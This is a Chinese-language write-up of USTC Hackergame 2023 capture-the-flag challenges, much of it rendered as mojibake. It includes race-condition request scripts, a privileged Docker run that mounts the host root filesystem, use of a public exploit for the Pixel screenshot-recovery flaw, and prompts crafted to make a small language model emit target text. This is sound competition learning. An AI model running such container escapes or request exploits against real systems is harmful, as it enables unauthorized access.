![æœ€ç»ˆå¾—åˆ†](assets/score.png)

è¿™æ˜¯æœ¬äººç¬¬å››æ¬¡å‚åŠ USTCçš„hackergameäº†233ï¼Œæœ‰èµ–ä»Šå¹´è®¸å¤šé¢˜ç›®æ­£å¥½å’Œè¿ç»´å’Œ~~ç¯å¢ƒå­¦~~çŸ¥è¯†ç›¸å…³å’Œ~~ChatGPTçš„æ¨ªç©ºå‡ºä¸–~~ï¼Œæœ¬äººçš„æ’åæ€»ç®—ç¬¬ä¸€æ¬¡è¿›äº†å‰100ã€‚

ä¹Ÿæ¬¢è¿å„ä½æ¥æˆ‘çš„åšå®¢ä¸ŠæŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š[https://sparktour.me/2023/11/04/ustc-hackergame-2023-writeup/](https://sparktour.me/2023/11/04/ustc-hackergame-2023-writeup/)

## Hackergame å¯åŠ¨

```
https://cnhktrz3k5nc.hack-challenge.lug.ustc.edu.cn:13202/?similarity=
```

æ³¨æ„åˆ°ç½‘é¡µæœ‰ä¸€ä¸ª`similarity=`çš„paramï¼Œæäº¤`similarity=100`å³å¯

## çŒ«å’ªå°æµ‹

> æƒ³è¦å€Ÿé˜…ä¸–ç•Œå›¾ä¹¦å‡ºç‰ˆå…¬å¸å‡ºç‰ˆçš„ã€ŠA Classical Introduction To Modern Number Theory 2nd ed.ã€‹ï¼Œåº”å½“å‰å¾€ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿åŒºå›¾ä¹¦é¦†çš„å“ªä¸€å±‚ï¼Ÿ**ï¼ˆ30 åˆ†ï¼‰**

åœ¨USTCçš„å›¾ä¹¦é¦†ç½‘ç«™ä¸Šæ‰¾ä¹¦åï¼Œå³å¯çœ‹åˆ°è¿™æœ¬ä¹¦åœ¨â€œè¥¿åŒºå¤–æ–‡ä¹¦åº“â€ã€‚å†googleä¸€ä¸‹å°±èƒ½å‘ç°ä¹¦åº“åœ¨12å±‚ï¼š

![USTCå›¾ä¹¦é¦†æŸ¥è¯¢åˆ°çš„å›¾ä¹¦ä½ç½®æˆªå›¾](assets/ustc-lib.png)

> ä»Šå¹´ arXiv ç½‘ç«™çš„å¤©ä½“ç‰©ç†ç‰ˆå—ä¸Šæœ‰äººå‘è¡¨äº†ä¸€ç¯‡å…³äºã€Œå¯è§‚æµ‹å®‡å®™ä¸­çš„é¸¡çš„å¯†åº¦ä¸Šé™ã€çš„è®ºæ–‡ï¼Œè¯·é—®è®ºæ–‡ä¸­ä½œè€…è®¡ç®—å‡ºçš„é¸¡å¯†åº¦å‡½æ•°çš„ä¸Šé™ä¸º 10 çš„å¤šå°‘æ¬¡æ–¹æ¯ç«‹æ–¹ç§’å·®è·ï¼Ÿ

googleåæ‰¾åˆ°äº† [ä½ è§è¿‡å“ªäº›æå“è®ºæ–‡ï¼Ÿ - çŸ¥ä¹ (zhihu.com)](https://www.zhihu.com/question/20337132/answer/3023506910)ï¼Œé‡Œé¢ç›´æ¥æåˆ°äº†æ˜¯23æ¬¡æ–¹ã€‚

> ä¸ºäº†æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œåœ¨**ç¼–è¯‘** Linux å†…æ ¸æ—¶åº”è¯¥é…ç½®å¥½å“ªä¸€æ¡å†…æ ¸é€‰é¡¹ï¼Ÿ**ï¼ˆ20 åˆ†ï¼‰**

google â€œtcp bbr kernel configâ€èƒ½æ‰¾åˆ°`CONFIG_TCP_CONG_BBR`ã€‚

> ğŸ¥’ğŸ¥’ğŸ¥’ï¼šã€Œæˆ‘â€¦â€¦ä»æ²¡è§‰å¾—å†™ç±»å‹æ ‡æ³¨æœ‰æ„æ€è¿‡ã€ã€‚åœ¨ä¸€ç¯‡è®ºæ–‡ä¸­ï¼Œä½œè€…ç»™å‡ºäº†èƒ½å¤Ÿè®© Python çš„ç±»å‹æ£€æŸ¥å™¨ ~~MyPY~~ mypy é™·å…¥æ­»å¾ªç¯çš„ä»£ç ï¼Œå¹¶è¯æ˜ Python çš„ç±»å‹æ£€æŸ¥å’Œåœæœºé—®é¢˜ä¸€æ ·å›°éš¾ã€‚è¯·é—®è¿™ç¯‡è®ºæ–‡å‘è¡¨åœ¨ä»Šå¹´çš„å“ªä¸ªå­¦æœ¯ä¼šè®®ä¸Šï¼Ÿ

æœ`mypy python type checking "halting problem"`ï¼Œå°±èƒ½æ‰¾åˆ° https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf ï¼Œurlé‡Œå°±èƒ½çœ‹åˆ°ä¼šè®®å«`ECOOP`äº†ã€‚

## æ›´æ·±æ›´æš—

æ‰“å¼€elementsæœ`flag{`å³å¯

![æŸ¥çœ‹ç½‘é¡µå…ƒç´ ](assets/inspect-elements.png)

## æ—…è¡Œç…§ç‰‡ 3.0

1. **ä½ è¿˜è®°å¾—ä¸å­¦é•¿è§é¢è¿™å¤©æ˜¯å“ªä¸€å¤©å—ï¼Ÿï¼ˆæ ¼å¼ï¼šyyyy-mm-ddï¼‰**åƒæ‹‰é¢çš„ç…§ç‰‡å¯ä»¥çœ‹å‡ºâ€œå­¦é•¿â€å»çš„æ˜¯`STATPHYS28` ï¼ˆhttps://statphys28.org/ï¼‰ï¼Œä¸€å¤©ä¸€å¤©è¯•å¯ä»¥è¯•å‡ºæ˜¯`2023-08-10`

2. **åœ¨å­¦æ ¡è¯¥å±•å…å±•ç¤ºçš„æ‰€æœ‰åŒç§é‡‘è‰²å¥–ç‰Œçš„å¾—ä¸»ä¸­ï¼Œå‡ºç”Ÿæœ€æ™šè€…è·å¥–æ—¶æ‰€åœ¨çš„ç ”ç©¶æ‰€ç¼©å†™æ˜¯ä»€ä¹ˆï¼Ÿ**æ‰¾ä¸œäº¬å¤§å­¦è·å¾—è¯ºè´å°”å¥–çš„æ•™æˆï¼Œå¯ä»¥æ‰¾åˆ°æ¯”è¾ƒå¹´è½»çš„é‚£ä½æ˜¯[Takaaki Kajita - Wikipedia](https://en.wikipedia.org/wiki/Takaaki_Kajita)ï¼Œå·¥ä½œç ”ç©¶æ‰€æ˜¯`ICRR`

3. **å¸ç¯·ä¸­æ´»åŠ¨æ‹›å‹Ÿå¿—æ„¿è€…æ—¶ç”¨äºæ”¶é›†æŠ¥åä¿¡æ¯çš„åœ¨çº¿é—®å·çš„ç¼–å·ï¼ˆä»¥å­—æ¯ S å¼€å¤´åæ¥æ•°å­—ï¼‰æ˜¯å¤šå°‘ï¼Ÿ**æ–‡ä¸­æåˆ°äº†â€œ*å½“ä½ ä»¬èµ°åˆ°ä¸€åº§åšç‰©é¦†å‰æ—¶ï¼Œ é©¬è·¯å¯¹é¢çš„å–·æ³‰å’Œå®ƒå‘¨å›´çš„æ™¯è‰²å¼•èµ·äº†ä½ çš„æ³¨æ„ã€‚*â€ï¼Œåœ¨googleåœ°å›¾ä¸Šçš„ä¸Šé‡ç«™é™„è¿‘çœ‹äº†ä¸€ä¸‹ä¹‹åå‘ç°è¿™ä¸ªå–·æ³‰æ¯”è¾ƒæ¥è¿‘â€œä¸Šé‡å…¬å›­å¤§å–·æ°´â€ï¼Œæœç´¢â€œ`ä¸Šé‡å…¬åœ’ ç«¹ã®å°åºƒå ´ (å™´æ°´åºƒå ´) 2023-08-10`â€å¯ä»¥æœåˆ°[ï¼”å¹´ã¶ã‚Šã®é–‹å‚¬ï¼ã€Œå…¨å›½æ¢…é…’ã¾ã¤ã‚Šinæ±äº¬2023ã€ã‚’ä¸Šé‡å…¬åœ’å™´æ°´åºƒå ´ã«ã¦é–‹å‚¬ï¼åŒ—ã‹ã‚‰å—ã¾ã§æ—¥æœ¬å…¨å›½ã®é…’è”µãŒé€ ã‚‹ç¾å‘³ã—ã„ã€Œæ¢…é…’ã€ï¼‘ï¼—ï¼ç¨®é¡ä»¥ä¸Šã‚’é£²ã¿æ¯”ã¹ã€‚ï½œä¸€èˆ¬ç¤¾å›£æ³•äººæ¢…é…’ç ”ç©¶ä¼šã®ãƒ—ãƒ¬ã‚¹ãƒªãƒªãƒ¼ã‚¹ (prtimes.jp)](https://prtimes.jp/main/html/rd/p/000000035.000021306.html)ï¼Œé‡Œé¢å°±èƒ½æ‰¾åˆ°å¿—æ„¿è€…çš„çš„æŠ¥åç½‘é¡µ`https://ws.formzu.net/dist/S495584522/`ã€‚

   ![ä¸Šé‡å…¬å›­çš„googleåœ°å›¾](assets/ueno-google-map.jpg)

4. **å­¦é•¿è´­ä¹°è‡ªå·±çš„åšç‰©é¦†é—¨ç¥¨æ—¶ï¼ŒèŠ±è´¹äº†å¤šå°‘æ—¥å…ƒï¼Ÿ**[ä¸œäº¬å›½ç«‹åšç‰©é¦†](https://www.tnm.jp/modules/r_free_page/index.php?id=113#ticket)å¤§å­¦ç”Ÿå…è´¹ï¼ˆ0ï¼‰

5. **å­¦é•¿å½“å¤©æ™šä¸Šéœ€è¦åœ¨å“ªæ ‹æ ‡å¿—æ€§å»ºç­‘ç‰©çš„é™„è¿‘é›†åˆå‘¢ï¼Ÿ**æŸ¥[STATPHYS28çš„ç½‘ç«™](https://statphys28.org/banquet.html)èƒ½æ‰¾åˆ°åœ¨é›†åˆåœ°ç‚¹åœ¨`å®‰ç”°è®²å ‚`ã€‚

6. **è¿›ç«™æ—¶ï¼Œä½ åœ¨ JR ä¸Šé‡ç«™ä¸­å¤®æ£€ç¥¨å£å¤–çœ‹åˆ°ã€Œãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ã€æ´»åŠ¨æ­£åœ¨é”€å”®åŠ¨ç‰©å‘¨è¾¹å•†å“ï¼Œè¯¥æ´»åŠ¨å¼ è´´çš„ç²‰è‰²èƒŒæ™¯æµ·æŠ¥ä¸Šæ˜¯ä»€ä¹ˆåŠ¨ç‰©ï¼ˆè®°ä½œ Aï¼Œä¸¤ä¸ªæ±‰å­—ï¼‰ï¼Ÿ åœ¨å‡ºç«™å¤„é™„è¿‘å»ºç­‘çš„å±‹é¡¶å¹¿å‘Šç‰Œä¸Šï¼Œæ¯å°æ—¶éƒ½ä¼šé¡½çš®å‡ºç°çš„é‚£åª 3D åŠ¨ç‰©æ˜¯ä»€ä¹ˆå“ç§ï¼Ÿï¼ˆè®°ä½œ Bï¼Œä¸‰ä¸ªæ±‰å­—ï¼‰ï¼Ÿï¼ˆæ ¼å¼ï¼šA-Bï¼‰**æœ`ãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ ä¸Šé‡é§…`èƒ½æœåˆ°è¿™ä¸ª[instagram post](https://www.instagram.com/p/Cvrw425vK_n/)ï¼Œé‡Œé¢æ˜¯`ç†ŠçŒ«`ï¼›ç”¨google lensè¯†åˆ«æœ€åä¸€å¼ å›¾èƒ½æœåˆ°è¿™ä¸ªè£…é¥°åœ¨`Super Mario Bros.Shop `ï¼Œåœ¨æ¸‹è°·é§…æ—è¾¹ï¼Œæœ`æ¸‹è°·é§… 3d åŠ¨ç‰©`èƒ½æ‰¾åˆ°åŠ¨ç‰©æ˜¯`ç§‹ç”°çŠ¬`

   ![google lensçš„è¯†åˆ«ç»“æœ](assets/google-lens.jpg)

## èµ›åšäº•å­—æ£‹

ç†è®ºä¸Šè·Ÿæ­£ç¡®å®ç°ç®—æ³•çš„AIä¸‹æ£‹ï¼Œæœ€å¤šåªèƒ½å¹³å±€ã€‚å› æ­¤ç¿»é˜…jsï¼Œæ³¨æ„åˆ°äº†å®ƒå‘é€æ£‹ç›˜çš„è¯·æ±‚æ˜¯é˜»å¡çš„ï¼š

```js
    async run() {
      if (this.isRunning || this.queue.length === 0) {
        return;
      }
      this.isRunning = true;
      const { func, context, args, resolve, reject } = this.queue.shift();
      try {
        const result = await func.apply(context, args);
        resolve(result);
      } catch (error) {
        reject(error);
      }
  
      this.isRunning = false;
      this.run();
    }
```

é‚£çŒœæµ‹ç›´æ¥å¿«é€Ÿå‘ä¸‹ä¸‰ä¸ªè¿èµ·æ¥çš„æ£‹ä½ç½®çš„è¯·æ±‚ï¼Œå°±èƒ½èµ¢äº†ï¼š

```python
# convert above curl to python requests
url = 'http://202.38.93.111:10077'
# create new session
s = requests.Session()
cookies = {'session': '.eJyr...'}
# post with cookie and data {"x":"1","y":"1"}
# å‘é€çš„è¶³å¤Ÿå¿«å°±è¡Œ
headers = {'Content-Type': 'application/json'}
r = s.post(url, cookies=cookies, headers=headers, data='{"x":"0","y":"1"}')
r = s.post(url, cookies=cookies, headers=headers, data='{"x":"1","y":"1"}')
r = s.post(url, cookies=cookies, headers=headers, data='{"x":"2","y":"1"}')
print(r.text)
# {"board":[[1,-1,0],[0,-1,0],[0,-1,0]],"msg":"flag{I_can_eat_your_pieces_7843afed75}"}
```

## å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹

é¢˜ç›®æåˆ°äº†`è°·æ­Œçš„ã€äº²å„¿å­ã€`(pixel)ï¼Œ`è¿ç³»ç»Ÿéƒ½æ²¡å¿ƒæ€å‡çº§`ï¼Œ`æˆªå›¾`ã€‚æœç´¢`pixel screenshot cve`èƒ½æœåˆ°[NVD - CVE-2023-35671 (nist.gov)](https://nvd.nist.gov/vuln/detail/CVE-2023-35671)ï¼Œå³pixelçš„æˆªå›¾ç¨‹åºä¸ä¼šæŠŠè£å‰ªçš„éƒ¨åˆ†ä»æ•°æ®é‡Œåˆ é™¤ï¼Œæœ‰éšç§æ³„æ¼é£é™©ã€‚éšååœ¨ç½‘ä¸Šæ‰¾åˆ°äº†[acropalypse poc](https://acropalypse.app/)çš„ç½‘é¡µå®ç°ï¼ŒæŠŠå›¾ä¼ ä¸Šå»ï¼Œè®¾ç½®é•¿å®½ä¸º1080*2400å³å¯æ¢å¤ï¼š

![æ¢å¤åçš„æˆªå›¾](assets/pixel_screenshot.png)

## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

ç¬¬ä¸€æ¬¡è¯·æ±‚å°±ä¼šæ‹¿åˆ°è¿™1000æ¡æ¶ˆæ¯çš„åˆ—è¡¨ï¼Œç„¶åæ ¹æ®æ¶ˆæ¯å‘å‡ºçš„delayå‘æ’¤å›çš„è¯·æ±‚å°±è¡Œï¼š

```python
url = 'http://202.38.93.111:10021/api/getMessages'
def send_callback(msgid):
    url = "http://202.38.93.111:10021/api/deleteMessage"
    headers = {'Content-Type': 'application/json'}
    data = {'id': msgid}
    response = requests.post(url, cookies=cookies, headers=headers, data=json.dumps(data))
    # print resp
    print(response.text)
    
# create new request session
session = requests.Session()
response = session.post(url, cookies=cookies)
# dump to json
resp_json = response.json()

start_time = time.time()
item_id = 0
for item in resp_json['messages']:
    # è®¡ç®—è‡ªä¸Šä¸€ä¸ªæ¡ç›®ä»¥æ¥å·²ç»è¿‡å»çš„æ—¶é—´
    elapsed_time = time.time() - start_time
    # è®¡ç®—è¿˜éœ€è¦ç­‰å¾…å¤šé•¿æ—¶é—´
    delay = item['delay'] - elapsed_time
    if delay > 0:
        time.sleep(delay)
    text = item['text']
    match = re.search(r'hack\[([a-zA-Z]*)\]', text)
    if match:
        print(delay, text)
        # id is the index of the message
        id = item_id
        send_callback(id)
    item_id += 1

# sleep 3 seconds
time.sleep(3)
flag_resp = session.post('http://202.38.93.111:10021/api/getflag', cookies=cookies)
print(flag_resp.text)
#{"flag":"flag{Web_pr0gra_mm1ng_9386f773ee_15fun}","success":true}
```

## è™«

å¬èµ·æ¥å¾ˆåƒæ˜¯è§£SSTVçš„é¢˜ç›®ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†[https://github.com/colaclanth/sstv.git](https://github.com/colaclanth/sstv.git)ç›´æ¥è½¬æ¢å°±èƒ½è§£å‡ºäº†ï¼š

![result-sstv](assets/result-sstv.png)

## JSON âŠ‚ YAML?

### JSON âŠ„ YAML 1.1

åœ¨[What valid JSON files are not valid YAML 1.1 files? - Stack Overflow](https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files)æ‰¾åˆ°äº†`12345e999`ã€‚

### JSON âŠ„ YAML 1.2

ç¿»åˆ°äº†[I accidentally used YAML.parse instead of JSON.parse and it worked | Hacker News (ycombinator.com)](https://news.ycombinator.com/item?id=30052128)å’Œ[YAML Ainâ€™t Markup Language (YAMLâ„¢) Version 1.2](https://yaml.org/spec/1.2-old/spec.html#id2759572)ï¼Œä»–ä»¬æåˆ°äº†ï¼š

> JSON's [RFC4627](http://www.ietf.org/rfc/rfc4627.txt) requires that [mappings](https://yaml.org/spec/1.2-old/spec.html#mapping//) [keys](https://yaml.org/spec/1.2-old/spec.html#key//) merely â€œSHOULDâ€ be [unique](https://yaml.org/spec/1.2-old/spec.html#equality//), while YAML insists they â€œMUSTâ€ be. Technically, YAML therefore complies with the JSON spec, choosing to treat duplicates as an error. In practice, since JSON is silent on the semantics of such duplicates, the only portable JSON files are those with unique keys, which are therefore valid YAML files.

é‚£æ„é€ ä¸€ä¸ªæœ‰ä¸¤ä¸ªä¸€æ ·çš„keyçš„jsonå°±è¡Œï¼š

```json
{"a": 1,"a": 1}
```

## Git? Git!

```shell
# git reflog
ea49f0c (HEAD -> main) HEAD@{0}: commit: Trim trailing spaces
15fd0a1 (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~
505e1a3 HEAD@{2}: commit: Trim trailing spaces
15fd0a1 (origin/main, origin/HEAD) HEAD@{3}: clone: from https://github.com/dair-ai/ML-Course-Notes.git

# git reset --hard 505e1a3
```

ä¸€ä¸ªä¸€ä¸ªæ‰¾å°±èƒ½çœ‹åˆ°README.mdé‡Œæœ‰`  <!-- flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t} -->`äº†

## HTTP é›†é‚®å†Œ

```
[100, 200, 206, 304, 400, 404, 405, 412, 413, 414, 416, 505]
```

### æ²¡æœ‰çŠ¶æ€â€¦â€¦å“ˆï¼Ÿï¼ˆéé¢„æœŸï¼‰

ç”¨CONNECT/TRACEä¼¼ä¹éƒ½å¯ä»¥åšåˆ°ï¼ˆåšçš„æ—¶å€™æƒ³èµ·æ¥äº†â€œHTTPä»£ç†â€ï¼‰

```
CONNECT / \r\nHost: a.com\r\n\r\n
```

### 5/12 ç§çŠ¶æ€ç 

#### [`100 Continue`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/100)

```
GET / HTTP/1.1\r\n
Expect: 100-continue\r\n
Host: example.com\r\n\r\n
```

#### [`200 OK`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200)

```
GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### [`206 Partial Content`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/206)

è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„éƒ¨åˆ†åŒºé—´

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1-2\r\n
Connection: close\r\n\r\n
```

#### [`304 Not Modified`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/304)

è‡ªæŸä¸ªetagåæ²¡æœ‰ä¿®æ”¹è¿‡

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: "64dbafc8-267"\r\n
Connection: close\r\n\r\n
```

#### [`400 Bad Request`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/400)

HTTPæ¢æˆä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿å°±è¡Œ

```
GET / FOO/1.1\r\n
Host: example.com\r\n
Connection: close\r\n\r\n
```

#### [`404 Not Found`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/404)

```
GET /notexist HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### [`405 Method Not Allowed`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/405)

åœ¨ä¸æ”¯æŒPOSTçš„åœ°æ–¹POST

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
Connection: close\r\n\r\n
```

#### [`412 Precondition Failed`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/412)

å’Œ304ç±»ä¼¼ï¼Œä½†æ—¶é—´å–ä¸€ä¸ªå¾ˆä¹…ä»¥å‰ï¼ˆæ–‡ä»¶åˆ›å»ºä¹‹å‰ï¼‰çš„æ—¶é—´

```
GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
If-Unmodified-Since: Sun, 15 Apr 2018 20:00:00 GMT\r\n\r\n
```

#### [`413 Payload Too Large`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/413)

è®¾ç½®ä¸€ä¸ªè¿‡é•¿çš„`Content-Length`

```
GET / HTTP/1.1\r\n
Content-Length: 10000000000\r\n
Host: example.com\r\n\r\n
```

#### [`414 URI Too Long`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/414)

è®¾ç½®ä¸€ä¸ªè¿‡é•¿çš„URLï¼ˆåœ¨é»˜è®¤é…ç½®é‡Œæ˜¯å¤§äº8192å­—èŠ‚çš„æ ·å­ï¼‰

```
GET /long-url-over-8000-words/ HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### [`416 Range Not Satisfiable`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/416)

å’Œ206ç±»ä¼¼ï¼Œä½†å–ä¸€ä¸ªä¸å­˜åœ¨çš„range

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=999-9999\r\n
Connection: close\r\n\r\n
```

#### [`505 HTTP Version Not Supported`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/505)

å‘æœåŠ¡å™¨ä¸è®¤è¯†çš„httpç‰ˆæœ¬

```
GET / HTTP/114514\r\n
Host: example.com\r\n
Connection: close\r\n\r\n
```

## Docker for Everyone

ç”¨`--privileged`å¯åŠ¨dockerå¹¶æŠŠæ ¹ç›®å½•æŒ‚è¿›dockeræ‰¾å°±å¯ä»¥äº†ï¼š

```shell
docker run -it -v /:/host-root â€”-privileged alpine
```

![æŒ‚è½½æ ¹ç›®å½•](assets/docker-mount.png)

## æƒœå­—å¦‚é‡‘ 2.0

ç”Ÿæˆ`cod_dict`çš„é‚£éƒ¨ä»½æ¯è¡Œåªæœ‰23ä¸ªcharï¼Œé‚£ç†è®ºä¸Šæ¯è¡Œåªè¦åŠ ä¸€ä¸ªcharå°±è¡Œäº†ï¼Œç„¶åç¡¬å‡‘å°±å¯ä»¥ï¼ˆå¯ä»¥é€šè¿‡å‰é¢çš„`flag{`å’Œåé¢çš„`}`å·æ¥å¯»æ‰¾ç¼ºçš„éƒ¨åˆ†å¤§æ¦‚åº”è¯¥æ’å…¥åœ¨ä»€ä¹ˆä½ç½®ã€‚

## é«˜é¢‘ç‡æ˜Ÿçƒ

å…ˆæŠŠasciinemaçš„å½•åˆ¶æ–‡ä»¶è¾“å‡ºåˆ°æ–‡æœ¬ï¼Œç„¶åæ›¿æ¢æ‰é‚£äº›é‡å å’Œçœ‹èµ·æ¥åƒæ˜¯ä¹±ç çš„éƒ¨åˆ†ï¼Œå¯ä»¥ç”¨jsæ£€æŸ¥å™¨æ£€æŸ¥ä¸€ä¸‹ï¼ˆæˆ–è€…ç”¨asciinemaå½•åˆ¶æœ€å¼€å¤´çš„æ—¶å€™æåˆ°çš„sha256ï¼‰

```
asciinema  play /Users/cyf/Downloads/hackergame-23/asciinema_restore.rec  > output.txt
```

æ£€æŸ¥å¥½äº†è¿è¡Œjså³å¯ï¼š

```
#node op.js
flag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371}
```

## å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ

### You Are Smart

```
# input
John likes to repeat what other saying. One day, Julia says "you are smart" to john, and John replied:
```

```
# reply
"you are smart, too". They both laugh and hug each other.

John and Julia have been playing together all day, and they are
ğŸ‘ğŸ‘ğŸ‘ flag1: flag{I-thINk-yOU-@rE-rEaLlY-rE4L1Y-Sm@RT} ğŸ‘ğŸ‘ğŸ‘
```

### Accepted

ä»[TinyStories-train.txt Â· roneneldan/TinyStories at main (huggingface.co)](https://huggingface.co/datasets/roneneldan/TinyStories/blob/main/TinyStories-train.txt)ä¸‹è½½ä¸€ä¸‹trainçš„è®­ç»ƒé›†ï¼Œç„¶ååœ¨è®­ç»ƒé›†é‡Œæ‰¾å‡º`accepted`å‰é¢çš„8ä¸ªcharï¼Œä¸€ä¸ªä¸€ä¸ªè¾“å…¥æ¨¡å‹è¯•ã€‚

```python
from transformers import AutoModelForCausalLM, AutoTokenizer, GenerationConfig
import torch
import pickle
from tqdm.notebook import trange, tqdm

device = "cuda:0" if torch.cuda.is_available() else "cpu"
model = AutoModelForCausalLM.from_pretrained('./TinyStories-33M')
model = model.to(device)
tokenizer = AutoTokenizer.from_pretrained("./TinyStories-33M")

# load counts_lst.pkl
with open('./counts_lst.pkl', 'rb') as f:
    counts_lst = pickle.load(f)

for i in trange(len(counts_lst)):
    prompt = counts_lst[i][0][0:7]
    input_ids = tokenizer.encode(prompt, return_tensors="pt").to(device)
    output = model.generate(input_ids, num_beams=1, max_new_tokens=30,pad_token_id=tokenizer.eos_token_id)
    output_text = tokenizer.decode(output[0], skip_special_tokens=True)
    # if output contains "accepted", print it
    if "accepted" in output_text:
        print(prompt)
        print(output_text)
        print()
```

èƒ½æ‰¾åˆ°ä»¥ä¸‹çš„è¾“å…¥è¾“å‡ºå¯¹ï¼š

```
atively
atively accepted the challenge.

The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed

Apology
Apology accepted. She was so happy and excited. She thanked the old man and ran off to show her friends her new toy.

The moral of
```

éšæ„è¾“å…¥ä¸€ä¸ªè¿›ç½‘é¡µå³å¯ï¼š

```
# input
atively

# reply
accepted the challenge.

The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed
ğŸ‰ğŸ‰ğŸ‰ flag2: flag{yOU-@R3-@cCepT3D-tO-C0nt1Nu3-THe-g4M3} ğŸ‰ğŸ‰ğŸ‰
```

## æµå¼æ˜Ÿçƒ

ä»é¢˜ç›®ç»™çš„è½¬æ¢è„šæœ¬æ¥çœ‹ï¼Œè½¬æ¢è„šæœ¬æŠŠè¾“å…¥çš„è§†é¢‘è½¬æ¢æˆäº†ä¸€ä¸ªn\*1çš„numpyæ•°ç»„ï¼Œå› æ­¤å¯ä»¥å†™ä¸€ä¸ªå‡½æ•°ä»è¿™ä¸ªæ•°ç»„é‡Œè½¬æ¢å›å¸§ï¼ˆæ³¨æ„é¢œè‰²é€šé“è¿˜è¦å ç”¨\*3ï¼‰ã€‚è¿™ä¸ªè„šæœ¬æ˜¯ç¬”è€…åœ¨å†™äº†æ¡†æ¶ä¹‹åè¯·chatgptå†™çš„ï¼Œæ•ˆæœæ„å¤–çš„ä¸é”™ï¼ˆè‡³å°‘èƒ½ç”¨ï¼‰

```python
import cv2
import numpy as np


# Path to the binary file
binary_file_path = "video.bin"

# Reading the content of the binary file
with open(binary_file_path, "rb") as f:
    video_data = np.frombuffer(f.read(), dtype=np.uint8)

def restore_video(data, frame_count, width, height, output_file="restored_video.mp4", frame_rate=10):
    """
    Try to restore the video from the given data using the specified parameters.

    :param data: NumPy array containing the video data
    :param frame_count: Number of frames in the video
    :param width: Width of each frame
    :param height: Height of each frame
    :param output_file: Name of the output video file
    :return: None
    """
    # Calculate the total number of pixels in the video
    total_pixels = frame_count * width * height * 3
    
    # Check if we have enough data to fill the video
    if data.size < total_pixels:
        print(f"Not enough data to fill the video. Missing {total_pixels - data.size} pixels.")
        return
    
    # Trim the data to fit the video exactly
    print("data used percentage:", total_pixels / data.size * 100)
    data = data[:total_pixels]
    
    
    # Reshape the data to create the video frames
    frames = data.reshape((frame_count, height, width, 3))
    
    # Define the codec and create a video writer object
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter(output_file, fourcc, frame_rate, (width, height))
    
    # Write each frame to the video file
    for i in range(frame_count):
        out.write(frames[i].astype(np.uint8))
    
    # Release the video writer object
    out.release()
    print("Video restored and saved to", output_file)
    # return first frame
    return frames.astype(np.uint8)

# Example usage: restore_video(video_data, 300, 640, 480)
# Note: The frame_count, width, and height parameters are just examples and need to be adjusted.

width = 640
frame_count=138
frame = restore_video(video_data_padded, frame_count,width , 510, frame_rate=10)
```

è§†é¢‘çš„é•¿å®½éœ€è¦è‡ªå·±çŒœï¼Œåªè¦å®½åº¦çŒœçš„å·®ä¸å¤šäº†åŸºæœ¬éƒ½èƒ½çœ‹å‡ºflagï¼ˆæ„Ÿè§‰æˆ‘çŒœçš„å®½åº¦ä¼¼ä¹ä¹Ÿä¸å¤ªå¯¹ï¼Œä¸è¿‡å·²ç»èƒ½åˆ†è¾¨å‡ºæ¥äº†ï¼‰ï¼Œå¯ä»¥ä»å¸¸è§çš„è§†é¢‘é•¿å®½é‡Œä¸€ä¸ªä¸€ä¸ªæµ‹è¯•ï¼ˆ~~ä½†æ²¡æƒ³åˆ°å‡ºé¢˜ç”¨çš„åŸå§‹è§†é¢‘æ˜¯ç«–ç€çš„ï¼Œå› æ­¤çœ‹èµ·æ¥æ¯”è¾ƒæ€ªï¼‰~~ã€‚

![restored video](assets/video-restore.jpg)

```
flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC}
```

## ä½å¸¦å®½æ˜Ÿçƒ

### å°è¯•ç‰›åˆ€

è½¬æ¢æˆsvgå°±è¡Œï¼ˆä½†ä¾ç„¶è¾¾ä¸åˆ°ç¬¬äºŒé—®50byteçš„è¦æ±‚ï¼‰ï¼š

```svg
<svg><path fill="#d92034" d="M0 0h380v1024H0z"/><path fill="#f1885d" d="M380 0h317v1024H380z"/><path fill="#d50415" d="M697 0h327v1024H697z"/></svg>
```

